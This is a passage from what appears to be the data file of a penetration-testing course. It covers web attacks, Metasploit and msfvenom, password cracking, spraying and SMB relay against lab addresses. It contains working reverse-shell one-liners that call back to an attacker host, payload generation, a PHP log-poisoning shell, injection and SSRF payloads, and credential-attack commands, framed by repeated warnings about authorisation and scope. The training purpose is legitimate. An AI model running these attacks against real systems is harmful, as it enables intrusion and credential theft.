smbmap -H 10.10.10.5 -u '' -p ''              # permission matrix per share
rpcclient -U '' -N 10.10.10.5                 # then: enumdomusers / enumdomgroups

# --- HTTP ---
whatweb -a3 http://10.10.10.5                 # tech fingerprint, CMS, frameworks
nikto -h http://10.10.10.5 -o nikto.html -Format html -maxtime 600s
curl -sI http://10.10.10.5                    # headers: server, cookies, security headers
curl -s http://10.10.10.5/robots.txt http://10.10.10.5/sitemap.xml
feroxbuster -u http://10.10.10.5 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak

# --- directory/file brute forcing ---
gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40
ffuf -u http://10.10.10.5/FUZZ -w wordlist.txt -mc 200,204,301,302,307,401,403 -fs 0 -t 60

# --- other services, quick reference ---
nmap -sV -p21 --script ftp-anon 10.10.10.5     # anonymous FTP
ftp 10.10.10.5                                 # user: anonymous / pass: anything
ssh-audit 10.10.10.5                           # SSH config weaknesses
testssl.sh --fast 10.10.10.5                   # TLS versions, ciphers, certs
nmap -sV -p1433,3306,5432,27017,6379,11211 10.10.10.5   # DBs: often unauthenticated
redis-cli -h 10.10.10.5 info                    # red often needs no auth at all
\`\`\`

**Filters and wordlists decide whether your web fuzzing succeeds**, more than the tool does. Learn three things: response size filtering (\`-fs\`), status code filtering (\`-mc\`), and which wordlist to use.

\`\`\`bash
# Calibrate before you fuzz: what does "not found" look like?
curl -s -o /dev/null -w '%{http_code} %{size_download}\\n' http://10.10.10.5/thisdoesnotexist
# Then exclude that size: -fs <size>   or that code: -fc 404   (and allow real ones with -mc)
ffuf -u http://10.10.10.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \\
     -fc 404 -fs 0 -t 100 -recursion -recursion-depth 2 -of json -o fuzz.json
\`\`\`

| Wordlist | Use |
|---|---|
| \`dirb/common.txt\` | fast sanity check, ~4600 entries |
| \`raft-medium-*.txt\` (SecLists) | well-balanced, good default |
| \`directory-list-2.3-medium.txt\` | the classic long run |
| \`/usr/share/wordlists/dirbuster/\\*.txt\` | Kali built-in, several depths |
| \`subdomains-top1million-5000.txt\` | DNS brute force |
| \`http-archive-top1000000\` (from \`wordlists\`) | real-world paths, high hit rate |

>= Trust response *size and timing*, not just status code. A 200 with identical byte length to the 404 page is a soft-404, and fuzzing tools will drown you in false positives if you do not filter it.`}
  ],
  keyIdeas:[
    'Twenty nmap flags cover 95% of scans: -sn -Pn -p- -sS -sT -sV -sC -O -A -T4 -oA --min-rate plus the NSE and evasion sets.',
    'Always -oA and always log. XML is what every downstream tool wants.',
    'masscan for breadth, nmap for depth, idle scan when you must not be seen.',
    'Enumeration, not scanning, is where findings come from. Do it service by service.',
    'Calibrate soft-404s before fuzzing; wordlist choice decides your hit rate.'
  ],
  tools:['t-nmap','t-masscan','t-gobuster','t-ffuf','t-feroxbuster','t-nikto','t-whatweb','t-enum4linux','t-smbmap','t-netexec'],
  labs:['lab-scan','lab-web','lab-smb'],
  xp:180
},

/* ---------------------------------------------------------------- 05 ---- */
{
  id:'m05', n:'05', phase:'EXPLOIT', title:'Web Application Attacks',
  blurb:'The 80% of modern engagements that is HTTP: proxy interception with Burp, injection classes, authentication flaws, file upload, SSRF, and how to prove impact without wrecking the app.',
  why:'Almost every external engagement leads to a web app. Web skills are also the most transferable, the most in demand, and the most demonstrable to a client — a working proof-of-concept screenshot beats a vulnerability scanner report every time.',
  lessons:[
    { t:'Burp Suite: the one tool you must master', body:`Burp sits between your browser and the target so you can see, pause, modify and replay every request. Nothing else comes close for web work.

\`\`\`bash
# Community edition is bundled with Kali and Parrot. Fire it up:
burpsuite &              # GUI. Proxy listens on 127.0.0.1:8080 by default
\`\`\`

\`\`\`text
SETUP (do it once)
  1. Proxy -> Options -> confirm 127.0.0.1:8080
  2. Install the CA: browse http://burp -> "CA Certificate" -> import into browser/OS trust store
     (Firefox has its own store; Chromium uses the system store)
  3. FoxyProxy -> point http/https at 127.0.0.1:8080  (toggle with one click)
  4. Proxy -> Intercept -> "Intercept is off" for normal browsing

THE CORE LOOP
  Proxy > HTTP history   : every request, forever. Filter by scope. This is your memory.
  Right-click > Send to Repeater   : edit and resend one request, see raw response. 80% of all work.
  Right-click > Send to Intruder   : automated payload iteration over selected positions.
  Target > Scope        : add the target; "show only in-scope items" halves the noise.
  Decoder / Comparer    : base64/JWT/hex work; diff two responses byte by byte.
\`\`\`

\`\`\`bash
# Community edition alternative worth knowing: Caido (added to Kali in 2025.3)
# and OWASP ZAP (fully free, scriptable, excellent for automation):
zap.sh -daemon -port 8090 -host 127.0.0.1      # headless, then drive via API
# mitmproxy for scripted interception:
mitmproxy -p 8080 -s add_header.py
\`\`\`

**Intruder in Community edition is rate-limited** (throttled deliberately). Two honest options: accept the slowness on small lists, or move the brute force to \`ffuf\`/\`hydra\`/\`patator\`, which are unthrottled and faster anyway. Professional licence removes the limit — the free tier is still enough to learn everything on this page.

>! Only ever put your *authorised* target in Burp scope, and clear HTTP history between engagements. Proxy history routinely contains session cookies and credentials that are not yours.`},

    { t:'The injection classes, and how to think about them', body:`Injection is one idea in many costumes: **the application concatenates your input into something that is not code-shaped data.** Your job is to find which something.

\`\`\`bash
# --- SQL injection: find it, then prove it, then extract from it ---
# manual probe: a single quote that produces an error or a changed response
curl -s 'http://10.10.10.5/item?id=1%27'
curl -s 'http://10.10.10.5/item?id=1%20AND%201=1' -o /tmp/a   # true
curl -s 'http://10.10.10.5/item?id=1%20AND%201=2' -o /tmp/b   # false  -> differ? injectable

sqlmap -u 'http://10.10.10.5/item?id=1' --batch --level=3 --risk=2
sqlmap -u 'http://10.10.10.5/item?id=1' --batch --dbs
sqlmap -u 'http://10.10.10.5/item?id=1' -D appdb --tables
sqlmap -u 'http://10.10.10.5/item?id=1' -D appdb -T users -C username,password --dump
# POST body / cookie / header injection points:
sqlmap -u 'http://10.10.10.5/login' --data='u=a&p=b' -p p --batch
sqlmap -u 'http://10.10.10.5/' --cookie='sess=abc*' --batch       # * marks the injection point
# beyond bool/time: error-based, UNION, stacked, out-of-band
sqlmap -r request.txt -p id --technique=U --batch                # request.txt from Burp
\`\`\`

\`\`\`bash
# --- XSS: client-side injection ---
# reflected:  /search?q=<script>alert(document.domain)</script>
# stored:     the payload is saved and served to other users (worse: privilege impact)
# DOM:        the sink is in JavaScript, the server never sees your payload
# prove impact properly: steal the session cookie where the app stores it in JS,
#                       or demonstrate an action on behalf of a victim
\`\`\`

\`\`\`bash
# --- Command injection / template injection / path traversal ---
# cmd inj:  ; id      | id      $(id)      \`id\`      %0a id
# SSTI:     {{7*7}} -> 49     \${7*7}     <%= 7*7 %>     #{7*7}
#           then escalate: {{config}}  {{''.__class__.__mro__[1].__subclasses__()}}
# traversal: ../../../../etc/passwd        ..%2f..%2f..%2fetc%2fpasswd
#            %252e%252e%252f (double-encoded)   ....//....//   (bypass filters)
\`\`\`

\`\`\`bash
# --- LFI to RCE: the classic escalation chain ---
# 1. read files:            ?page=../../../../etc/passwd
# 2. log poisoning:         inject PHP into a log, then include the log
curl -s -A '<?php system($_GET["c"]); ?>' http://10.10.10.5/
curl -s 'http://10.10.10.5/?page=/var/log/apache2/access.log&c=id'
# 3. php filter chains / session files / /proc/self/environ (see PayloadsAllTheThings)
\`\`\`

>= \`sqlmap\` against a big app with \`--level=5 --risk=3\` and no \`--batch\` is how people accidentally take down production. Bound it: use the scope in \`--scope\`/\`-r\` request files, keep risk low, and confirm with the client before any write-based technique (\`--dbs\` reads; \`--os-shell\` writes).`},

    { t:'Auth, access control, and the bugs that pay', body:`Modern bug bounty and penetration testing is dominated by **broken access control** and **broken authentication** — not clever injection.

\`\`\`bash
# --- IDOR / horizontal privilege escalation: the highest-yield bug class ---
for id in $(seq 1 50); do
  curl -s -H "Cookie: sess=$SESSION" "http://10.10.10.5/api/orders/$id" | head -c 120; echo " <- id=$id"
done
# also try: 1010 instead of 10, uuid enumeration, DELETE/PUT on someone else's object,
#           numeric vs uuid vs base64-encoded id params, GraphQL node IDs

# --- JWT abuse ---
# decode without verifying (never trust a JWT the client holds)
python3 - <<'EOF'
import base64, json, sys
tok = sys.argv[1] if len(sys.argv)>1 else ""
head, body, sig = (tok.split(".") + ["",""])[:3]
def d(x): return json.loads(base64.urlsafe_b64decode(x + "="*(-len(x)%4)))
print("header:", d(head)); print("payload:", d(body))
EOF
# attacks: alg:none  |  HS256 signed with a guessed/brute-forced secret
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt     # HS256 key cracking
# RS256 -> HS256 confusion, kid path traversal, jku/x5u pointing at your server

# --- authentication flaws to test every single time ---
# username enumeration via response diff or timing
# password reset: token in response? predictable? no expiry? host-header injection?
# MFA: bypass by direct request to the post-MFA endpoint; code reuse; rate limit?
# OAuth: open redirect_uri, missing state, implicit flow token leakage
# session: fixation, no rotation after login, cookie without HttpOnly/Secure/SameSite

# --- forced browsing / missing function level access control ---
ffuf -u http://10.10.10.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
# try admin routes as a normal user; try methods: OPTIONS, PUT, DELETE, PATCH
curl -X OPTIONS -i http://10.10.10.5/api/admin/users
\`\`\`

\`\`\`bash
# --- SSRF: make the server fetch what it should not ---
# where: webhooks, image importers, PDF generators, URL preview, "fetch from URL" fields
# cloud metadata endpoints - the payoff:
curl -s http://10.10.10.5/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
#   AWS IMDSv1 (still common), GCP http://metadata.google.internal/computeMetadata/v1/
#   Azure: http://169.254.169.254/metadata/identity/oauth2/token
# bypasses for weak filters: 127.0.0.1 vs 127.1 vs 0.0.0.0 vs [::1]
#                             http://2130706433/  (decimal)   http://017700000001/ (octal)
#                             DNS rebinding, redirect chains, gopher:// for internal protocols
\`\`\`

\`\`\`bash
# --- file upload to shell: prefer reversible proofs ---
# extension games:  .php .php5 .phtml .pht .phar  ->  shell.php.jpg, shell.pHp, shell.php%00.jpg
# content-type is client-side; magic bytes can be faked; .htaccess upload can enable php in a jpg dir
curl -F 'file=@shell.php;type=image/jpeg' http://10.10.10.5/upload
# after upload: can you execute it? if you can write where a webroot executes, that is RCE
\`\`\`

>! An RCE proof-of-concept that runs \`id\` and stops is professional. A reverse shell that then "looks around a bit to see what's interesting" is scope creep. Every command after initial access must be justifiable in the report.

>= Write every web finding as: **parameter -> payload -> observable evidence -> business impact**. That last part is what turns "we found SQLi" into "we could read every customer record".`}
  ],
  keyIdeas:[
    'Burp Suite: proxy, HTTP history, Repeater, Intruder, Decoder. Master the loop, not the menu.',
    'Injection is one idea: input concatenated into non-data. Find the sink, then the class.',
    'Broken access control and broken auth beat injection in modern engagements — test every request as a different user.',
    'Escalate LFI/upload/SSRF to a hard proof, then stop. Scope creep is a report finding against you.',
    'Every finding = parameter + payload + evidence + impact.'
  ],
  tools:['t-burp','t-sqlmap','t-zap','t-nuclei','t-wpscan','t-curl'],
  labs:['lab-web','lab-exploit'],
  xp:200
},

/* ---------------------------------------------------------------- 06 ---- */
{
  id:'m06', n:'06', phase:'EXPLOIT', title:'Exploitation & Payload Craft',
  blurb:'Searchsploit, Metasploit end to end, msfvenom payloads, and — more importantly — when to abandon both and exploit manually.',
  why:'Frameworks make the easy cases trivial and the hard cases impossible. Experts know the framework deeply *and* can read a PoC, fix its hardcoded IP, and make it work when the exploit module does not exist.',
  lessons:[
    { t:'searchsploit and the exploit-db workflow', body:`Before writing anything, check whether someone already did.

\`\`\`bash
searchsploit apache 2.4.52
searchsploit -w samba 4.6                  # -w prints the ExploitDB URLs
searchsploit -m 12345                      # mirror (copy) exploit 12345 into cwd
searchsploit -x 12345                      # examine it before running (do this, always)
searchsploit --nmap recon/lab-web01.xml    # exploits matching YOUR nmap XML results
searchsploit -u                            # update the local database
\`\`\`

The professional rule for third-party exploits:

\`\`\`bash
cp /usr/share/exploitdb/exploits/linux/remote/12345.py ./e.py
md5sum e.py                                # note the hash in your notes
view e.py                                  # READ IT. All of it.
grep -nE 'requests|socket|subprocess|os.system|exec|eval|base64|curl|wget' e.py
# look for: hardcoded attacker IP, legitimate-looking exfil, encoded blobs, obfuscated eval
python3 e.py                               # in a VM, without your engagement creds present
\`\`\`

>! Public exploits are code someone else wrote, running with your privileges on a machine whose IP is in your scope document. Every year people get owned by "public PoCs" that phone home, drop miners, or simply delete the target. Read the entire file, prefer GitHub sources with real commit history, and run it in a throwaway VM first. There is no version of "I trusted the exploit" that survives an incident review.`},

    { t:'Metasploit: the parts that matter', body:`\`\`\`bash
msfconsole -q                                   # start quietly
sudo systemctl start postgresql                 # REQUIRED for the database; do this first
# in msf:      db_status  -> should say "Connected to msf"
\`\`\`

\`\`\`text
msf6 > search type:exploit platform:linux samba
msf6 > search cve:2021-44228
msf6 > info exploit/linux/samba/xyz          # read it before you use it
msf6 > use exploit/linux/samba/xyz
msf6 exploit(...) > show options              # ALWAYS read this
msf6 exploit(...) > show targets
msf6 exploit(...) > set RHOSTS 10.10.10.5
msf6 exploit(...) > set LHOST 10.10.14.7      # your tun0 address (ip a | grep tun0)
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(...) > check                     # supported by many modules - use it
msf6 exploit(...) > run / exploit
\`\`\`

\`\`\`bash
# --- workspace hygiene: one workspace per engagement ---
msf6 > workspace -a ACME-2026-04
msf6 > db_nmap -sV -sC 10.10.10.5             # nmap into the msf database
msf6 > hosts; services; vulns; loot; creds    # everything is queryable
msf6 > services -p 445 -R                     # set RHOSTS from db results
\`\`\`

\`\`\`text
--- meterpreter: the commands that matter ---
getuid  sysinfo  getpid                       # who am I, what is this
ps  migrate <pid>                             # move into a stable process
shell                                         # native shell (limited, but real)
upload /tmp/linpeas.sh .   download /etc/passwd /tmp/
hashdump        (Windows, needs SYSTEM)        run post/windows/gather/hashdump
run post/multi/recon/local_exploit_suggester   # automated privesc triage
run post/windows/gather/enum_domain
portfwd add -l 8080 -p 80 -r 10.10.20.5        # pivot a port locally
route add 10.10.20.0/24 <session_id>           # route a whole subnet through the session
background      sessions -l   sessions -i 1
\`\`\`

\`\`\`bash
# --- resource scripts: automate an entire exploitation sequence ---
cat > auto.rc <<'EOF'
workspace -a ACME
db_nmap -sV -sC 10.10.10.5
services -p 445 -R
use auxiliary/scanner/smb/smb_version
run
EOF
msfconsole -q -r auto.rc
\`\`\`

>= \`run post/multi/recon/local_exploit_suggester\` and \`post/windows/gather/enum_domain\` are the two highest-value post modules in the framework. Automate them with a resource script and you will never forget a plaintext password again.`},

    { t:'msfvenom, payload selection, and manual exploitation', body:`\`\`\`bash
# --- payload generation, and how to actually get it to run ---
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=443 -f elf -o m.elf
chmod +x shell.elf                             # a "silent" failure is usually a missing +x

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=443 -f exe -o m.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=443 -f exe -e x64/xor_dynamic -i 5 -o enc.exe
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=443 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=... LPORT=443 -f raw -o shell.jsp
msfvenom -p python/meterpreter/reverse_tcp LHOST=... LPORT=443 -f raw -o shell.py
msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=443 -f csharp   # for C# loaders
msfvenom -p linux/x64/shell_reverse_tcp LHOST=... LPORT=443 -f raw | base64 -w0   # paste into web app
\`\`\`

\`\`\`bash
# --- encoders, and the honest truth about them ---
msfvenom -l encoders
# Encoding is NOT antivirus evasion. It obfuscates bytes; modern AV/EDR flags behaviour,
# not signatures. Treat encoding as a compatibility tool (bad character sets, format quirks),
# not a cloak. Real evasion is a whole discipline: module 12.
\`\`\`

\`\`\`bash
# --- listeners (choose by what the target can reach) ---
msfconsole -q -x 'use exploit/multi/handler; \
  set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 10.10.14.7; set LPORT 443; run'
# a plain nc listener: less capable, zero dependencies, often enough
nc -lvnp 443
# rlwrap gives you arrow keys and history in that shell - quality of life
rlwrap -cAr nc -lvnp 443
# upgrade a dumb shell to a proper TTY (do this every time):
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then:  Ctrl-Z    stty raw -echo; fg    Enter    export TERM=xterm; stty rows 40 cols 150
\`\`\`

**Manual exploitation: read the PoC, fix it, run it.** Frameworks cover popular software; bespoke apps need you.

\`\`\`bash
# Typical workflow when nothing exists for the target:
# 1. identify exact version           nmap -sV / banner grab / changelog / favicon hash
# 2. find the bug                     searchsploit, GitHub, CVE feeds, advisories, blog posts
# 3. reproduce the trigger            curl / Burp, capture the exact request that causes it
# 4. understand the primitive         overflow? format string? deserialisation? path?
# 5. adapt to this target             offsets differ, ASLR, bad chars, different architecture
# 6. build the payload               msfvenom -f raw -b '\\x00\\x0a' + your chain
# 7. get a foothold non-destructively for evidence
\`\`\`

\`\`\`bash
# --- reverse shells when the framework is overkill ---
# bash:      bash -i >& /dev/tcp/10.10.14.7/443 0>&1
# python3:   python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.7",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
# php:       php -r '$s=fsockopen("10.10.14.7",443);exec("/bin/sh -i <&3 >&3 2>&3");'
# powershell: powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.14.7',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
# revshells.com generates these in every language if you forget syntax under pressure
\`\`\`

>! Pick the port to match the environment. 443/tcp outbound is allowed almost everywhere; 4444 is the port every IDS has a signature for. Match *your listener* to your payload, and confirm egress is possible before you blame the payload.`}
  ],
  keyIdeas:[
    'searchsploit -m then READ THE WHOLE FILE before running any public exploit.',
    'Metasploit: start postgresql, use workspaces, db_nmap, and resource scripts to automate.',
    'Encoders are compatibility tools, not AV evasion. Know the difference.',
    'Always upgrade a dumb shell to a real TTY; pick 443 over 4444.',
    'When no module exists: identify version, reproduce the trigger, isolate the primitive, adapt.'
  ],
  tools:['t-metasploit','t-msfvenom','t-searchsploit','t-nc','t-socat'],
  labs:['lab-exploit'],
  xp:180
},

/* ---------------------------------------------------------------- 07 ---- */
{
  id:'m07', n:'07', phase:'EXPLOIT', title:'Passwords & Credential Attacks',
  blurb:'Offline cracking with hashcat and John, online attacks with hydra and spraying discipline, hash identification, rule-based mangling, and why lockout awareness is a real skill.',
  why:'Credentials remain the most reliable path into any environment, and the same maths that cracks hashes tells you how strong your own passwords really are. This module also teaches restraint: the wrong spray locks out the client\'s whole domain.',
  lessons:[
    { t:'Know your hash before you crack it', body:`The number one beginner mistake is pointing hashcat at a file without knowing the format. Identify first, always.

\`\`\`bash
hashid '$2y$10$abcdefghijklmnopqrstuv'          # bcrypt?
hash-identifier                                 # interactive, same job
john --list=formats | tr ',' '\\n' | head -40    # the formats John knows
hashcat --example-hashes | grep -A3 -i 'NTLM'   # exact sample + mode number
hashcat -m 0 hash.txt                             # -m 0 = MD5; the error output lists modes
\`\`\`

| Hash | Example prefix/look | hashcat \`-m\` | John \`--format=\` |
|---|---|---|---|
| MD5 | 32 hex | 0 | raw-md5 |
| SHA1 | 40 hex | 100 | raw-sha1 |
| SHA256 | 64 hex | 1400 | raw-sha256 |
| NTLM (Windows) | 32 hex, from \`hashdump\` | 1000 | nt |
| NetNTLMv2 | \`user::domain:hex:hex:hex\` | 5600 | netntlmv2 |
| Kerberos 5 TGS-REP (Kerberoast) | \`$krb5tgs$23$*\` | 13100 | krb5tgs |
| Kerberos 5 AS-REP (ASREPRoast) | \`$krb5asrep$23$*\` | 18200 | krb5asrep |
| bcrypt | \`$2a$\`/\`$2y$\` | 3200 | bcrypt |
| md5crypt (Linux) | \`$1$\` | 500 | md5crypt |
| sha512crypt (Linux) | \`$6$\` | 1800 | sha512crypt |
| MySQL 4.1+ | \`*HEXUPPER\` | 300 | mysql-sha1 |
| WordPress | \`$P$B\` (phpass) | 400 | phpass |
| JWT (HS256) | \`eyJ...\` | 16500 | HMAC-SHA256 |
| 7-Zip | \`$7z$\` | 11600 | 7z |
| SSH private key | \`-----BEGIN OPENSSH PRIVATE KEY\` | 22931 | ssh |
| ZIP / RAR / PDF | various | 17200 / 13000 / 10500 | zip / rar / pdf |

\`\`\`bash
# extract hashes from what you found
john --format=zip --extract-to=hashes.txt protected.zip       # or
zip2john protected.zip > zip.hash
ssh2john id_rsa > id_rsa.hash
gzip -d /usr/share/wordlists/rockyou.txt.gz                   # 14M password list, start here
\`\`\`

>= \`hashcat --example-hashes\` is the single best hash-mode reference on the machine. Far faster than reading a wiki table, and it tells you the exact expected input format.`},

    { t:'hashcat: engines, modes, rules, masks', body:`\`\`\`bash
# --- the four attack modes you will actually use ---
# 1. dictionary
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt

# 2. dictionary + rules (the highest value-per-second technique in all of cracking)
hashcat -m 1000 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
ls /usr/share/hashcat/rules/       # best64, dive.rule, rockyou-30000, OneRuleToRuleThemAll
hashcat -m 1000 ntlm.txt rockyou.txt -r OneRuleToRuleThemAll.rule -r best64.rule   # chain rules

# 3. mask / brute force (PCFG-informed: use what you know about the policy)
hashcat -m 1000 ntlm.txt -a 3 '?u?l?l?l?l?d?d'         # Pasword12 shape
hashcat -m 1000 ntlm.txt -a 3 '?u?l?l?l?l?d?d?s'       # + special char, for complexity policies
hashcat -m 1000 ntlm.txt -a 3 '?d?d?d?d'               # PINs
hashcat -m 1000 ntlm.txt -a 3 'Zoth?d?d?d?d'           # seeded mask: combine with what you know
hashcat --show -m 1000 ntlm.txt                        # display already-cracked results

# 4. combinatorial / hybrid: dictionary ends, masks fill gaps (or vice versa)
hashcat -m 1000 ntlm.txt -a 6 dict.txt '?d?d?d'        # word + 3 digits
hashcat -m 1000 ntlm.txt -a 7 '?d?d' dict.txt          # 2 digits + word
\`\`\`

\`\`\`bash
# --- craft custom wordlists from what you learned in recon ---
cewl -d 4 -m 6 -w cewl.txt http://10.10.10.5          # words from the target's own site
crunch 8 8 -t Company@@ -o masks.txt                   # pattern masks
# combine + mutate everything you found:
cat cewl.txt company.txt users.txt | sort -u > base.txt
hashcat -m 1000 ntlm.txt base.txt -r best64.rule
# mutation engine for really hard targets:
#   hashcat-utils: rli, rsmangler, hcxtools, kwprocessor (keyboard walks)
#   John's incremental + --rules=Jumbo covers a lot of the same ground
\`\`\`

\`\`\`bash
# --- John the Ripper: the other engine, better at some formats ---
john --wordlist=rockyou.txt --format=raw-md5 hashes.txt
john --rules --wordlist=rockyou.txt hashes.txt          # inline mangling
john --incremental hashes.txt                            # brute force with its own model
john --show hashes.txt                                   # what did we crack
john --session=crack1 ...                                # resumable
john --restore=crack1
# --format=auto is smart enough for most inputs; be explicit when it is not
\`\`\`

\`\`\`bash
# --- hardware reality ---
hashcat -I                            # list devices; check your GPU/CPU backend
hashcat -b -m 1000                    # benchmark NTLM
hashcat -w 3 -m 1000 ...              # workload 1-4 (4 = desktop unusable, but fastest)
nvidia-smi; clinfo                    # GPU drivers present?
# Keep the GPU cool; sustained cracking thermally throttles. Watch hashcat's status line.
\`\`\`

>= Rules beat brute force. \`rockyou.txt + best64.rule\` cracks more real-world password corpora in ten minutes than a mask attack cracks in ten hours, because humans mutate words the same way everywhere.`},

    { t:'Online attacks: restraint is the skill', body:`Offline cracking has no victim. Online attacks hit live authentication systems, log every attempt, and can lock out real users. Treat every online attempt as a finding to justify.

\`\`\`bash
# --- what to check BEFORE the first password attempt ---
# 1. Is the account lockout policy known? Ask, or read the scope doc / AD policy.
#    If unknown, assume 5 attempts per 30 minutes PER ACCOUNT (typical default).
# 2. How many accounts? 200 users x 5 attempts = 1000 events in the client's SIEM.
# 3. Is there an alert? Password spray almost always alerts. Get written agreement.
# 4. Capture the current lockout counter if the platform exposes it.
\`\`\`

\`\`\`bash
# --- PASSWORD SPRAYING: one password, many accounts, slow ---
# This is the technique that actually works against real AD environments,
# because it never trips per-account lockout. It DOES trip SIEM rules - get authorisation.
nxc smb 10.10.10.10 -u users.txt -p 'Autumn2026!' --continue-on-success
nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
nxc ldap 10.10.10.10 -u users.txt -p 'Autumn2026!' --continue-on-success

# --- hydra: per-service brute force, use with a small, targeted list ---
hydra -L users.txt -P rockyou.txt -t 4 -f -V ssh://10.10.10.5
hydra -l admin -P passwords.txt -t 4 ssh://10.10.10.5
hydra -l admin -P passwords.txt http-post-form \\
  '/login:username=^USER^&password=^PASS^:F=Invalid credentials' -V
hydra -l admin -P passwords.txt 10.10.10.5 ftp
hydra -l msfadmin -P passwords.txt rdp://10.10.10.20
hydra -U                                        # module list, per-protocol help

# --- medusa / patator: alternatives when hydra misbehaves ---
medusa -h 10.10.10.5 -u admin -P passwords.txt -M ssh -t 4 -f
patator ssh_login host=10.10.10.5 user=admin password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed'
\`\`\`

\`\`\`bash
# --- after you have one credential: reuse before you brute force ---
# Credential reuse across services is the norm, not the exception.
nxc smb 10.10.10.0/24 -u user -p 'Passw0rd!' --continue-on-success
nxc winrm 10.10.10.20 -u user -p 'Passw0rd!'        # does it work over WinRM? shell:
evil-winrm -i 10.10.10.20 -u user -p 'Passw0rd!'
hydra -C creds.txt ssh://10.10.10.5                 # combolist: one pair per line
# pass-the-hash (no cracking needed at all, when it works):
nxc smb 10.10.10.0/24 -u administrator -H <NThash> --continue-on-success
\`\`\`

\`\`\`bash
# --- offline conversions you will need constantly ---
# /etc/shadow + /etc/passwd -> crackable
unshadow passwd.txt shadow.txt > unshadowed.txt && john unshadowed.txt
# NetNTLMv2 captured with Responder -> crack or relay
#   hashcat -m 5600 netntlmv2.txt rockyou.txt
# Kerberoast: request TGS for any SPN, crack offline at leisure
impacket-GetUserSPNs zoth.local/user:pass -dc-ip 10.10.10.10 -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule
# AS-REP roast: accounts with "do not require Kerberos preauth"
impacket-GetNPUsers zoth.local/ -dc-ip 10.10.10.10 -usersfile users.txt -no-pass -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
\`\`\`

>! **Never** run \`hydra -P rockyou.txt\` against a live domain controller or any authenticated service in a real engagement. 14 million attempts = a locked-out company, an incident response, and a burned engagement. Spray with 1-3 passwords, known policy, and written approval. Brute force is a lab technique; spraying is a field technique.

>= The pass-the-hash workflow is the punchline of this module: on Windows networks, **you very often never need to crack anything at all.** Hashes are usable material. That fact should reshape how you budget your time — crack what you must, use what you can.`}
  ],
  keyIdeas:[
    'Identify the hash before cracking: hashid, john --list=formats, hashcat --example-hashes.',
    'Rules > masks: rockyou + best64 + OneRuleToRuleThemAll cracks real corpora fastest.',
    'Spraying (one password, many accounts) beats brute forcing on real AD; brute force is a lab technique.',
    'Get written approval and know the lockout policy before the first online attempt. Always.',
    'On Windows, pass-the-hash often removes the need to crack at all.'
  ],
  tools:['t-hashcat','t-john','t-hydra','t-hashid','t-responder','t-impacket'],
  labs:['lab-passwords'],
  xp:180
},

/* ---------------------------------------------------------------- 08 ---- */
{
  id:'m08', n:'08', phase:'EXPLOIT', title:'Windows, SMB & Active Directory',
  blurb:'The environment where most corporate breaches happen: SMB enumeration, relay attacks, NetExec, BloodHound attack paths, Kerberos abuse, and lateral movement.',
  why:'Active Directory runs the majority of enterprise networks, and its default configuration gives an authenticated attacker a path to Domain Admin. This is the highest-paid skill set in offensive security.',
  lessons:[
    { t:'SMB: enumeration, relay, and the classic mistakes', body:`\`\`\`bash
# --- discovery and null sessions ---
nxc smb 10.10.10.0/24                          # subnet sweep: OS, name, domain, signing
nxc smb 10.10.10.10 -u '' -p '' --shares       # null session share listing
nxc smb 10.10.10.10 -u 'guest' -p '' --shares --users --groups --pass-pol
nxc smb 10.10.10.10 -u user -p pass --sam       # dump local SAM (needs admin)
nxc smb 10.10.10.10 -u user -p pass --lsa       # local security authority secrets
nxc smb 10.10.10.10 -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=loot
enum4linux-ng -A 10.10.10.10 -oJ enum.json
smbmap -H 10.10.10.10 -u user -p pass
\`\`\`

\`\`\`bash
# --- SMB relay: when signing is not enforced, you own the network ---
# Step 1: find machines with signing DISABLED (the 'signing:False' column)
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
# Step 2: prove the finding is real by poisoning and capturing a hash
sudo responder -I eth0 -wdv            # listens for LLMNR/NBT-NS/mDNS broadcasts
# Step 3: relay what you caught to a signing-disabled host
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks -of loot/
#   without -socks: ntlmrelayx executes preconfigured commands on relay targets
#   with -socks:    it builds a SOCKS proxy so nxc/psexec can use the relayed session
# in ntlmrelayx,  socks                       -> list recovered sessions
#                 proxychains nxc smb 10.10.10.20 -u '' -p '' --shares
\`\`\`

\`\`\`bash
